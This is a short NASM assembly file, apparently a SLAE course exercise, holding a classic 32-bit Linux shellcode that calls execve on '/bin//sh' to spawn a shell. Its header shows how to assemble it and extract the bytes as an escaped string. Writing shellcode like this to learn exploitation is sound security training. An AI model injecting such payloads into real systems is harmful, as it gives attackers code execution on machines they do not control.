; Filename:      shellcode-orig-asm.nasm
; Author:        Nicolas Barrière
; Student ID:    SLAE - 1398
; Created Date:  26.12.2018
; Assembler:     nasm -f elf32 shellcode-orig-asm.nasm -o shellcode-orig-asm.o
; Linker:        ld -N -m elf_i386 shellcode-orig-asm.o -o shellcode-orig-asm
; Assembly dump: objdump -d ./shellcode-orig-asm|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'


global _start

section .text

_start:

  xor    ecx,ecx
  mul    ecx
  mov    al,0xb
  push   ecx
  push   0x68732f2f
  push   0x6e69622f
  mov    ebx,esp
  int    0x80
